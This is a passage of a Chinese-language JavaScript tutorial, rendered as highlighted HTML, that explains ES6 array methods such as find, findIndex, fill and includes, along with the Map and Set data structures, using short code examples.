class="line"></span><br><span class="line"><span class="comment">// 对于没有部署TypedArray的copyWithin方法的平台</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要采用下面的写法:</span></span><br><span class="line"></span><br><span class="line">[].copyWithin.call(<span class="keyword">new</span> <span class="built_in">Int32Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]), <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>); <span class="comment">// Int32Array [4, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>find()：用于找出第一个符合条件的数组成员</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">10</span>, <span class="number">-1</span>].find(<span class="function">(<span class="params">n</span>) =&gt;</span> n &lt; <span class="number">0</span>) <span class="comment">// -5</span></span><br><span class="line"><span class="comment">// 找出数组中第一个小于0的成员，-1布什第一个，不返回。</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>].find(<span class="function"><span class="keyword">function</span>(<span class="params">value, index, arr</span>) </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">9</span>;</span><br><span class="line">&#125;) <span class="comment">// 10</span></span><br><span class="line"><span class="comment">// 找出大于9的，15不是第一个，不返回</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>findIndex()：返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>].findIndex(<span class="function"><span class="keyword">function</span>(<span class="params">value, index, arr</span>) </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">9</span>;</span><br><span class="line">&#125;) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">[<span class="literal">NaN</span>].indexOf(<span class="literal">NaN</span>) <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">[<span class="literal">NaN</span>].findIndex(<span class="function"><span class="params">y</span> =&gt;</span> <span class="built_in">Object</span>.is(<span class="literal">NaN</span>, y)) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>fill()：使用给定值，填充一个数组<br>第二个参数（可选）表示替换起始位置，第三个参数（可选），表示结束位置</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].fill(<span class="number">7</span>) <span class="comment">// [7, 7, 7]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>).fill(<span class="number">7</span>) <span class="comment">// [7, 7, 7]</span></span><br><span class="line"></span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].fill(<span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// ['a', 7, 'c']</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>includes()：是否包含指定元素，es7语法，babel转换器已支持<br>第二个参数可选，表示指定搜索起始位置，从起始位置到结尾，默认为0，负数表示倒数；当大于数组长度，会重置为从0开始</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>);     <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">4</span>);     <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="literal">NaN</span>].includes(<span class="literal">NaN</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">3</span>);   <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">-1</span>);   <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">0</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">1</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">2</span>);    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">3</span>);    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-1</span>);    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-2</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-3</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-4</span>);    <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p><strong> 含义和基本用法  </strong><br><code>JavaScript</code> 的对象（Object），本质上是键值对的集合（Hash 结构），但是传统上只能用字符串当作键。这给它的使用带来了很大的限制。</p>
<p>为了解决这个问题，<code>ES6</code> 提供了 <code>Map</code> 数据结构。它类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键。也就是说，<code>Object</code> 结构提供了“字符串—值”的对应，<code>Map</code> 结构提供了“值—值”的对应，是一种更完善的 <code>Hash</code> 结构实现。如果你需要“键值对”的数据结构，<code>Map</code> 比 <code>Object</code> 更合适。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">p</span>: <span class="string">'Hello World'</span>&#125;;</span><br><span class="line"></span><br><span class="line">m.set(o, <span class="string">'content'</span>)</span><br><span class="line">m.get(o) <span class="comment">// "content"</span></span><br><span class="line"></span><br><span class="line">m.has(o) <span class="comment">// true</span></span><br><span class="line">m.delete(o) <span class="comment">// true</span></span><br><span class="line">m.has(o) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></p>
<p>作为构造函数，<code>Map</code> 也可以接受一个数组作为参数。该数组的成员是一个个表示键值对的数组。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="string">'name'</span>, <span class="string">'张三'</span>],</span><br><span class="line">  [<span class="string">'title'</span>, <span class="string">'Author'</span>]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">map.size <span class="comment">// 2</span></span><br><span class="line">map.has(<span class="string">'name'</span>) <span class="comment">// true</span></span><br><span class="line">map.get(<span class="string">'name'</span>) <span class="comment">// "张三"</span></span><br><span class="line">map.has(<span class="string">'title'</span>) <span class="comment">// true</span></span><br><span class="line">map.get(<span class="string">'title'</span>) <span class="comment">// "Author"</span></span><br></pre></td></tr></table></figure></p>
<p>当参数为数组是，其内部的逻辑如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> items = [</span><br><span class="line">  [<span class="string">'name'</span>, <span class="string">'张三'</span>],</span><br><span class="line">  [<span class="string">'title'</span>, <span class="string">'Author'</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line">items.forEach(</span><br><span class="line">  ([key, value]) =&gt; map.set(key, value)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>如果读取一个未知的键，则返回 <code>undefined</code>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Map</span>().get(<span class="string">'asfddfsasadf'</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></p>
<p>注意，只有对同一个对象的引用，Map 结构才将其视为同一个键。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line">map.set([<span class="string">'a'</span>], <span class="number">555</span>);</span><br><span class="line">map.get([<span class="string">'a'</span>]) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></p>
<p>上面代码的set和get方法，表面是针对同一个键，但实际上这是两个值，内存地址是不一样的，因此get方法无法读取该键，返回undefined。</p>
<p>同理，同样的值的两个实例，在 <code>Map</code> 结构中被视为两个键。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> k1 = [<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">const</span> k2 = [<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line">map</span><br><span class="line">.set(k1, <span class="number">111</span>)</span><br><span class="line">.set(k2, <span class="number">222</span>);</span><br><span class="line"></span><br><span class="line">map.get(k1) <span class="comment">// 111</span></span><br><span class="line">map.get(k2) <span class="comment">// 222</span></span><br></pre></td></tr></table></figure></p>
<p>由上可知，<code>Map</code> 的键实际上是跟内存地址绑定的，只要内存地址不一样，就视为两个键。注意：以上说的只针对引用类型。</p>
<p>如果 <code>Map</code> 的键是一个简单类型的值（数字、字符串、布尔值），则只要两个值严格相等，<code>Map</code> 将其视为一个键，比如0和-0就是一个键，布尔值true和字符串true则是两个不同的键。另外，undefined和null也是两个不同的键。虽然NaN不严格相等于自身，但 <code>Map</code> 将其视为同一个键。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line">map.set(<span class="number">-0</span>, <span class="number">123</span>);</span><br><span class="line">map.get(+<span class="number">0</span>) <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line">map.set(<span class="literal">true</span>, <span class="number">1</span>);</span><br><span class="line">map.set(<span class="string">'true'</span>, <span class="number">2</span>);</span><br><span class="line">map.get(<span class="literal">true</span>) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">map.set(<span class="literal">undefined</span>, <span class="number">3</span>);</span><br><span class="line">map.set(<span class="literal">null</span>, <span class="number">4</span>);</span><br><span class="line">map.get(<span class="literal">undefined</span>) <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">map.set(<span class="literal">NaN</span>, <span class="number">123</span>);</span><br><span class="line">map.get(<span class="literal">NaN</span>) <span class="comment">// 123</span></span><br></pre></td></tr></table></figure>
<p><strong> Map </strong> 的属性或方法<br>属性：</p>
<ul>
<li><code>size</code> 属性<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">map.set(<span class="string">'foo'</span>, <span class="literal">true</span>);</span><br><span class="line">map.set(<span class="string">'bar'</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">map.size <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>方法：</p>
<ol>
<li><p>操作方法</p>
<ul>
<li><code>set(key, value)`</code>：设置键名key对应的键值为value，然后返回整个 Map 结构，即可以链式操作。</li>
<li><code>get(key)</code>：读取key对应的键值，如果找不到key，返回undefined。</li>
<li><code>has(key)</code>：查询某个键是否在当前 Map 对象之中，返回布尔值。</li>
<li><code>delete(key)</code>：删除某个键，返回true。如果删除失败，返回false。</li>
<li><code>clear()</code>：清除所有成员，没有返回值。</li>
</ul>
</li>
<li><p>遍历方法</p>
<ul>
<li><code>[Symbol.iterator]()</code>： 返回键值的遍历器</li>
<li><code>keys()</code>：返回键名的遍历器。</li>
<li><code>values()</code>：返回键值的遍历器。</li>
<li><code>entries()</code>：返回所有成员的遍历器。</li>
<li><code>forEach()</code>：遍历 Map 的所有成员。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="string">'F'</span>, <span class="string">'no'</span>],</span><br><span class="line">  [<span class="string">'T'</span>,  <span class="string">'yes'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> map.keys()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// "F"</span></span><br><span class="line"><span class="comment">// "T"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> map.values()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// "no"</span></span><br><span class="line"><span class="comment">// "yes"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> map.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item, item[<span class="number">0</span>], item[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ["F", "no"] "F" "no"</span></span><br><span class="line"><span class="comment">// ["T", "yes"] "T" "yes"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> map.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// "F" "no"</span></span><br><span class="line"><span class="comment">// "T" "yes"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意，for of遍历可使用break或continue跳出或跳过循环，for in遍历没有。</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<p><code>Map</code> 结构转为数组结构，比较快速的方法是使用扩展运算符（…）<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="number">1</span>, <span class="string">'one'</span>],</span><br><span class="line">  [<span class="number">2</span>, <span class="string">'two'</span>],</span><br><span class="line">  [<span class="number">3</span>, <span class="string">'three'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">[...map.keys()]</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line">[...map.values()]</span><br><span class="line"><span class="comment">// ['one', 'two', 'three']</span></span><br><span class="line"></span><br><span class="line">[...map.entries()]</span><br><span class="line"><span class="comment">// [[1,'one'], [2, 'two'], [3, 'three']]</span></span><br><span class="line"></span><br><span class="line">[...map]</span><br><span class="line"><span class="comment">// [[1,'one'], [2, 'two'], [3, 'three']]</span></span><br></pre></td></tr></table></figure></p>
<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p><strong> 含义和基本用法  </strong><br><code>ES6</code> 提供了新的数据结构 <code>Set</code>。它类似于数组，但是成员的值都是唯一的，没有重复的值，我们可以利用 <code>Set</code> 的成员唯一性来实现数组的去重<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>].forEach(<span class="function"><span class="params">x</span> =&gt;</span> s.add(x));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log([...s]); <span class="comment">// [2, 3, 5, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> s) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2 3 5 4</span></span><br></pre></td></tr></table></figure></p>
<p>利用 <code>Set</code> 给数组或字符串去重<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[...new <span class="built_in">Set</span>([<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>])]; <span class="comment">// [2, 3, 5, 4]</span></span><br><span class="line"><span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>])); <span class="comment">// 使用Array.from 将Set转换成数组</span></span><br><span class="line"></span><br><span class="line">[...new <span class="built_in">Set</span>(<span class="string">'2354522'</span>)].join(<span class="string">''</span>); <span class="comment">// "2354"</span></span><br><span class="line"><span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(<span class="string">'2354522'</span>)).join(<span class="string">''</span>)</span><br></pre></td></tr></table></figure></p>
<p>Set函数可以接受一个数组（或者具有 iterable 接口的其他数据结构）作为参数，用来初始化。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 例一</span></span><br><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>]);</span><br><span class="line">[...set] <span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 例二</span></span><br><span class="line"><span class="keyword">const</span> items = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>]);</span><br><span class="line">items.size <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 例三</span></span><br><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>(<span class="built_in">document</span>.querySelectorAll(<span class="string">'div'</span>)); <span class="comment">// 接收一个数组对象</span></span><br><span class="line">set.size <span class="comment">// 56</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类似于</span></span><br><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"><span class="built_in">document</span></span><br><span class="line"> .querySelectorAll(<span class="string">'div'</span>)</span><br><span class="line"> .forEach(<span class="function"><span class="params">div</span> =&gt;</span> set.add(div));</span><br><span class="line">set.size <span class="comment">// 56</span></span><br></pre></td></tr></table></figure></p>
<p><strong> Set </strong> 的属性或方法<br>属性：</p>
<ul>
<li><code>Set.prototype.constructor</code>：构造函数，默认就是 <code>Set</code> 函数。</li>
<li><code>Set.prototype.size</code>：返回 <code>Set</code> 实例的成员总数。</li>
</ul>
<p>方法：</p>
<ol>
<li><p>操作方法</p>
<ul>
<li><code>add(value)</code>：添加某个值，返回 <code>Set</code> 结构本身。</li>
<li><code>delete(value)</code>：删除某个值，返回一个布尔值，表示删除是否成功。</li>
<li><code>has(value)</code>：返回一个布尔值，表示该值是否为 <code>Set</code> 的成员。</li>
<li><code>clear()</code>：清除所有成员，没有返回值。</li>
</ul>
</li>
<li><p>遍历方法</p>
<ul>
<li><code>[Symbol.iterator]()</code>： 返回键值的遍历器</li>
<li><code>keys()</code>：返回键名的遍历器。</li>
<li><code>values()</code>：返回键值的遍历器。</li>
<li><code>entries()</code>：返回键值对的遍历器。</li>
<li><code>forEach()</code>：使用回调函数遍历每个成员。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> set.keys()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// red</span></span><br><span class="line"><span class="comment">// green</span></span><br><span class="line"><span class="comment">// blue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> set.values()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// red</span></span><br><span class="line"><span class="comment">// green</span></span><br><span class="line"><span class="comment">// blue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> set.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ["red", "red"]</span></span><br><span class="line"><span class="comment">// ["green", "green"]</span></span><br><span class="line"><span class="comment">// ["blue", "blue"]</span></span><br><span class="line"></span><br><span class="line">set.forEach(<span class="function">(<span class="params">key, value</span>) =&gt;</span> <span class="built_in">console</span>.log(key + <span class="string">' : '</span> + value)); <span class="comment">// key = value</span></span><br><span class="line"><span class="comment">// red : red</span></span><br><span class="line"><span class="comment">// green : green</span></span><br><span class="line"><span class="comment">// blue : blue</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<p><strong> Set 和 Object 判断是否有某个Key的对比 </strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象的写法</span></span><br><span class="line"><span class="keyword">const</span> properties = &#123;</span><br><span class="line">  <span class="string">'width'</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">'height'</span>: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (properties[someName]) &#123;</span><br><span class="line">  <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Set的写法</span></span><br><span class="line"><span class="keyword">const</span> properties = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"></span><br><span class="line">properties.add(<span class="string">'width'</span>);</span><br><span class="line">properties.add(<span class="string">'height'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (properties.has(someName)) &#123;</span><br><span class="line">  <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
